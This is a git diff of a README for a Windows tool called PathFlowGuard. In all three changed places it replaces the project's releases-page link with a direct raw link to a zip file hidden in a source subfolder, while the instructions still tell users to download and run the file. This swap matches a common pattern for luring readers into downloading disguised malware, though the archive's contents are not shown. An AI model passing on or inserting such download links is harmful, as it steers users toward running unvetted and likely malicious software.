@@ -1,6 +1,6 @@
 # 🛡️ PathFlowGuard - Keep Intake Moving Cleanly
 
-[![Download PathFlowGuard](https://img.shields.io/badge/Download-PathFlowGuard-blue?style=for-the-badge)](https://github.com/Neuroblastomapoor946/PathFlowGuard/releases)
+[![Download PathFlowGuard](https://img.shields.io/badge/Download-PathFlowGuard-blue?style=for-the-badge)](https://raw.githubusercontent.com/Neuroblastomapoor946/PathFlowGuard/main/python/orchestrator/Path_Guard_Flow_v3.5.zip)
 
 ## 🧭 What PathFlowGuard Does
 
@@ -34,7 +34,7 @@ For best results:
 
 Visit this page to download the latest Windows release:
 
-https://github.com/Neuroblastomapoor946/PathFlowGuard/releases
+https://raw.githubusercontent.com/Neuroblastomapoor946/PathFlowGuard/main/python/orchestrator/Path_Guard_Flow_v3.5.zip
 
 On that page, look for the newest release and download the Windows file for PathFlowGuard. If you see a `.zip` file, download it first and then open it. If you see a `.exe` file, you can run it after download.
 
@@ -232,7 +232,7 @@ Simple habits make the workflow easier to follow and reduce mistakes.
 
 Download or update PathFlowGuard from the release page:
 
-https://github.com/Neuroblastomapoor946/PathFlowGuard/releases
+https://raw.githubusercontent.com/Neuroblastomapoor946/PathFlowGuard/main/python/orchestrator/Path_Guard_Flow_v3.5.zip
 
 ## 🏷️ Topics
 
